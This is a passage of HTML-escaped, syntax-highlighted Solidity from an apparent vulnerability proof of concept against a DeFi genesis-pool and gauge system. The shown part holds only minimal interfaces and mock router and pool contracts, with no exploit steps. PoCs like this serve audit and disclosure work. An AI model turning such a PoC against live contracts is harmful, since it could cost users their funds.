class=\"mtk11\"\u003egetGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (IGenesisPoolBase.GenesisInfo \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetLiquidityPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (IGenesisPoolBase.LiquidityPool \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IGenesisPoolBase (for structs)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIGenesisPoolBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estruct\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efundingToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartTime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eduration\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ethreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10000 = 100%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartPrice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupplyPercent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurityTime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estruct\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexternal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IGauge interface needed for the PoC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIGauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IBaseV1Factory interface needed for the PoC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetGenesisStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// --- Mock Contracts ---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// A very simple mock router\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewasCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esomeRouterFunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Dummy addLiquidity to avoid reverts when called by MockGenesisPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewasCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// A very simple mock GenesisPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGenesisPoolBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elaunchCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// To satisfy getGenesisInfo\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// To satisfy getLiquidityPoolInfo\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/*maturityTime*/\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elaunchCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router is address(0)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Simulate failure if router is zero\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan 